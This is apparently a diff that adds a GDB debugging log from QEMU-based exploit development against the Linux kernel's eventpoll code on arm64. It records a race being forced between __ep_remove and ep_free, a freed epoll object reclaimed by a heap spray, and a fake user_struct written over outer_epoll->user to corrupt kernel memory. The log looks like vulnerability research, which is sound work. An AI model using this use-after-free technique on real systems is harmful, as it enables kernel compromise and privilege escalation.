@@ -1,0 +1,58 @@
+[*] Connected to QEMU
+Breakpoint 1 at 0xffff8000802bc9c0: file fs/eventpoll.c, line 346.[*] Breakpoints set. Continuing execution.
+[*] Thread A hit __ep_remove+0x19c (WRITE_ONCE finished).
+[*] outer_epoll (ep param) = -0x7fff7f2fec10
+[*] inner_epoll (file->f_ep) = -0xfffffca80640
+[*] epi = 0x0
+[*] Original instruction at 0xffff8000802bc9c0: -0x6effa000
+[*] Patched PC with infinite loop to suspend Thread A!
+Breakpoint 2 at 0xffff8000802bcbb4: file fs/eventpoll.c, line 793.
+[*] Thread B hit ep_free(-0xfffffca80640)!
+Breakpoint 3 at 0xffff8000802bcbbc: file fs/eventpoll.c, line 909.
+[*] Thread B finished ep_free. inner_epoll is now FREED!
+[*] Memory dump of freed inner_epoll (BEFORE spray):
+[*] 
+0xffff00000357f9c0:	0x0000000000000000	0x0000000000000000
+0xffff00000357f9d0:	0xffff00000357f9d0	0xffff00000357f9d0
+0xffff00000357f9e0:	0x0000000000000000	0xffff00000357f9e8
+0xffff00000357f9f0:	0xffff00000357f9e8	0x0000000000000000
+0xffff00000357fa00:	0xffff00000357fa00	0xffff00000357fa00
+0xffff00000357fa10:	0xffff00000357fa10	0xffff00000357fa10
+0xffff00000357fa20:	0xffff00000357fa80	0x0000000000000000
+0xffff00000357fa30:	0x0000000000000000	0xffffffffffffffff
+0xffff00000357fa40:	0x0000000000000000	0xffff80008152be98
+0xffff00000357fa50:	0xffff000002523000	0x0000000000000001
+0xffff00000357fa60:	0xffff000003556dd0	0x0000000000000000
+0xffff00000357fa70:	0x0000000000000000	0x0000000000000000
+
+[*] Timer fired! Interrupting to check spray...
+[Switching to Thread 1.2]
+[*] Interrupted! Checking spray on inner_epoll...
+[*] 
+0xffff00000357f9c0:	0xffff00000357fb40	0xffff0000036e8cc0
+0xffff00000357f9d0:	0x0000000000001337	0x0000000000000090
+0xffff00000357f9e0:	0x0000000000000000	0xffff0000024f4a28
+0xffff00000357f9f0:	0x0000000000000000	0x0000000000000000
+0xffff00000357fa00:	0x0000000000000000	0x0000000000000000
+0xffff00000357fa10:	0x0000000000000000	0x0000000000000000
+0xffff00000357fa20:	0x0000000000000000	0x0000000000000000
+0xffff00000357fa30:	0x0000000000000000	0x0000000000000000
+0xffff00000357fa40:	0x0000000000000000	0xfffffffffffffff8
+0xffff00000357fa50:	0x0000000000000000	0x0000000000000000
+0xffff00000357fa60:	0xdead000000000000	0x0000000000000000
+0xffff00000357fa70:	0x0000000000000000	0x0000000000000000
+
+[*] Continuing to let harness run spray...
+[*] Hang timeout!
+[*] Setting up fake user_struct and overwriting outer_epoll->user...
+[*] Writing fake user_struct at -0xfffffca80440
+[*] Fake user_struct: lock=0, count=0, counters=-0x7fff7e9e2998
+[*] Overwriting outer_epoll->user (offset 136) to -0xfffffca80448
+[*] outer_epoll->user now = -0xfffffca80448
+[*] Restoring Thread A and continuing...
+[*] Restored original instruction
+Breakpoint 4 at 0xffff80008052f5d8: file ./arch/arm64/include/asm/current.h, line 19.
+[*] Set breakpoint at percpu_counter_add_batch
+[Switching to Thread 1.1]
+[*] GDB script done.
+[Inferior 1 (process 1) detached]
